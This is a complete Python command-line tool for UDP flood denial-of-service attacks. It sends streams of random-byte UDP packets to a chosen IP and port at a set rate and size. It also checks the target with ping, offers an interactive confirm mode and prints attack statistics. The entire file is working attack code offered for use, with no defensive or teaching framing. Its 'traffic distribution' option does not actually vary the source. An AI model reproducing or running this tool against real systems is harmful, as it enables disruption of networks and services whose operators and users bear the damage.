import socket
import argparse
import random
import time
import subprocess
import platform

class GUDPAttacker:
    def __init__(self, target_ip, target_port, num_packets, rate=1000, timeout=5, packet_size=1024):
        self.target_ip = target_ip
        self.target_port = target_port
        self.num_packets = num_packets
        self.rate = rate 
        self.timeout = timeout 
        self.packet_size = packet_size

        self.packets_sent = 0
        self.packets_successful = 0
        self.start_time = None

    def generate_random_data(self):
        """Generate random data of specified size."""
        return bytearray([random.randint(0, 255) for _ in range(self.packet_size)])

    def send_packet(self):
        """Send a single UDP packet."""
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        data = self.generate_random_data()
        try:
            udp_socket.sendto(data, (self.target_ip, self.target_port))
            self.packets_sent += 1
            self.packets_successful += 1
        except socket.error:
            self.packets_sent += 1
        finally:
            udp_socket.close()

    def attack(self, verbose=False):
        """Perform the GUDP attack."""
        self.start_time = time.time()
        interval = 1.0 / self.rate

        while self.packets_sent < self.num_packets:
            start_packet_time = time.time()
            self.send_packet()
            end_packet_time = time.time()
            time.sleep(max(0, interval - (end_packet_time - start_packet_time)))

            if verbose:
                print(f"Sent packet {self.packets_sent}/{self.num_packets} to {self.target_ip}:{self.target_port}")

    def run_attack(self, verbose=False):
        """Run the attack with performance metrics."""
        self.attack(verbose)
        total_time = time.time() - self.start_time
        packets_per_second = self.num_packets / total_time if total_time > 0 else 0

        print("\nAttack Summary:")
        print(f"  - Target IP: {self.target_ip}")
        print(f"  - Target Port: {self.target_port}")
        print(f"  - Number of Packets: {self.num_packets}")
        print(f"  - Packets Sent: {self.packets_sent}")
        print(f"  - Successful Packets: {self.packets_successful}")
        print(f"  - Packets per Second: {packets_per_second:.2f}")
        print(f"  - Total Time: {total_time:.2f} seconds")

class GUDPAttackScript:
    def __init__(self):
        self.parser = argparse.ArgumentParser(description='Simple GUDP Attack Script with Extra Features')
        self.parser.add_argument('target_ip', help='Target IP address')
        self.parser.add_argument('target_port', type=int, help='Target port number')
        self.parser.add_argument('num_packets', type=int, help='Number of packets to send')
        self.parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode (print detailed information)')
        self.parser.add_argument('-r', '--rate', type=int, default=1000, help='Packet rate (packets per second)')
        self.parser.add_argument('-t', '--timeout', type=int, default=5, help='Timeout for packet sending (seconds)')
        self.parser.add_argument('-s', '--packet-size', type=int, default=1024, help='Size of each UDP packet')
        self.parser.add_argument('-i', '--interactive', action='store_true', help='Interactive mode')
        self.parser.add_argument('-td', '--traffic-distribution', type=int, default=1, help='Number of source IPs for traffic distribution')

    def ping_target(self, target_ip):
        """Ping the target IP to check if it is reachable."""
        try:
            ping_cmd = subprocess.Popen(['ping', '-c', '1', target_ip], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            ping_result, _ = ping_cmd.communicate()
            if ping_cmd.returncode == 0:
                return True
            else:
                return False
        except Exception as e:
            print(f"Error pinging target: {e}")
            return False

    def run(self):
        args = self.parser.parse_args()

        if args.interactive:
            self.run_interactive_mode(args)
            return

        if not self.ping_target(args.target_ip):
            print(f"Target {args.target_ip} is unreachable. Aborting attack.")
            return

        attacker = GUDPAttacker(args.target_ip, args.target_port, args.num_packets, args.rate, args.timeout, args.packet_size)
        attacker.run_attack(args.verbose)

    def run_interactive_mode(self, args):
        print("Starting Interactive Mode...")
        confirm = input(f"Proceed with the attack on {args.target_ip}:{args.target_port}? (y/n): ")
        if confirm.lower() != 'y':
            print("Attack aborted.")
            return

        for _ in range(args.traffic_distribution):
            attacker = GUDPAttacker(args.target_ip, args.target_port, args.num_packets, args.rate, args.timeout, args.packet_size)
            attacker.run_attack(args.verbose)
            print()

if __name__ == "__main__":
    script = GUDPAttackScript()
    script.run()
